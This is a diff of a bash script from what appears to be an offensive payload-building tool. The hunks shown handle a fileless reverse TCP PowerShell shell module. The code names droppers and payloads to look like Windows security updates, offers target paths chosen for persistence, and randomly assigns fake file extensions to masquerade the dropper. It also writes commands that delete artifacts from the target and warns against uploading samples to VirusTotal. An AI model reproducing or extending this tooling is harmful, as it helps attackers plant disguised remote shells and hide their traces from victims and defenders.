@@ -12172,8 +12172,7 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" 
 else
    echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "del /F /Q $Drop.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "del /F /Q $Drop.vbs" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
 fi
 zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.txt" --info > /dev/null 2>&1
 sh_menu
@@ -12197,9 +12196,7 @@ if ! [ "$?" -eq "0" ]; then
    sh_exit
 fi
 
-## Delete old certs to prevent future errors.
-rm $IPATH/output/cert.pem > /dev/nul 2>&1
-rm $IPATH/output/key.pem > /dev/nul 2>&1
+
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
 echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
@@ -12219,6 +12216,9 @@ Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB452
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
+## Delete old certs to prevent future errors.
+rm $IPATH/output/cert.pem > /dev/nul 2>&1
+rm $IPATH/output/key.pem > /dev/nul 2>&1
 
 
 ## setting default values in case user have skip this ..
@@ -12459,11 +12459,11 @@ random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
 ## Random chose one fake extension.
 # to Masquerade the dropper real extension (MITRE T1036)
 index=$(cat /dev/urandom | tr -dc '1-5' | fold -w 1 | head -n 1)
-if [ "$index" = "1" ] || [ "$index" = "5" ]; then
+if [ "$index" = "1" ] || [ "$index" = "3" ]; then
    ext="crdownload"
 elif [ "$index" = "2" ]; then
    ext="cfg"
-elif [ "$index" = "3" ]; then
+elif [ "$index" = "5" ]; then
    ext="tmp"
 elif [ "$index" = "4" ]; then
    ext="bin"
